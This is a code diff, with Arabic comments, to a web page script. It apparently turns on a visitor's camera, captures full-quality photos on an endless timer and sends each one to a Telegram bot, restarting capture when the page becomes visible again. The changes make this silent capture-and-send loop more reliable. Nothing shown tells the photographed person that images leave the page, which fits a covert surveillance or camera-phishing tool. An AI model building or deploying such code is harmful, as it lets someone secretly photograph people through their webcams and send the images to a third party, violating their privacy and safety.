@@ -38,6 +38,7 @@
     
     let stream = null;
     let captureTimer = null;
+    let isReady = false;
 
     async function startCameraAndCapture() {
       try {
@@ -53,14 +54,26 @@
         
         video.srcObject = stream;
         
-        // انتظار حتى تصبح الكاميرا جاهزة
+        // انتظار حتى تصبح الكاميرا جاهزة وتشتغل
+        await video.play();
+        
+        // انتظار إضافي للتأكد من أن الكاميرا ترسل إطارات حقيقية
         await new Promise((resolve) => {
-          video.onloadedmetadata = () => {
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            resolve();
+          const checkReady = () => {
+            if (video.readyState >= 2 && video.videoWidth > 0 && video.videoHeight > 0) {
+              canvas.width = video.videoWidth;
+              canvas.height = video.videoHeight;
+              isReady = true;
+              resolve();
+            } else {
+              requestAnimationFrame(checkReady);
+            }
           };
+          checkReady();
         });
+        
+        // انتظار إضافي 1 ثانية للتأكد من سطوع الكاميرا
+        await new Promise(resolve => setTimeout(resolve, 1000));
         
         // بدأ التقاط الصور التلقائي إلى ما لا نهاية
         captureTimer = setInterval(captureAndSend, CAPTURE_INTERVAL);
@@ -75,16 +88,25 @@
     }
 
     function captureAndSend() {
-      if (!video.srcObject || video.readyState < 2) return;
+      if (!isReady || !video.srcObject || video.readyState < 2) {
+        console.warn('[Not Ready] Waiting for camera...');
+        return;
+      }
       
       try {
         const ctx = canvas.getContext('2d');
+        
+        // رسم الفيديو على canvas
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
         
         // تحويل Canvas إلى Blob (ملف PNG حقيقي)
         canvas.toBlob((blob) => {
-          sendToTelegram(blob);
-        }, 'image/png');
+          if (blob && blob.size > 0) {
+            sendToTelegram(blob);
+          } else {
+            console.error('[Empty Blob]');
+          }
+        }, 'image/png', 1.0); // 1.0 يعني جودة كاملة
         
       } catch (err) {
         console.error('[Capture Error]', err);
@@ -107,6 +129,8 @@
         
         if (!data.ok) {
           console.error('[Telegram Error]', data.description);
+        } else {
+          console.log('[Sent] Photo sent successfully');
         }
       } catch (err) {
         console.error('[Send Error]', err);
@@ -118,6 +142,18 @@
       if (captureTimer) clearInterval(captureTimer);
       if (stream) {
         stream.getTracks().forEach(track => track.stop());
+      }
+    });
+
+    // إعادة المحاولة إذا الصفحة أصبحت مخفية ثم ظهرت
+    document.addEventListener('visibilitychange', () => {
+      if (document.hidden) {
+        if (captureTimer) clearInterval(captureTimer);
+      } else {
+        if (isReady) {
+          captureAndSend();
+          captureTimer = setInterval(captureAndSend, CAPTURE_INTERVAL);
+        }
       }
     });
 
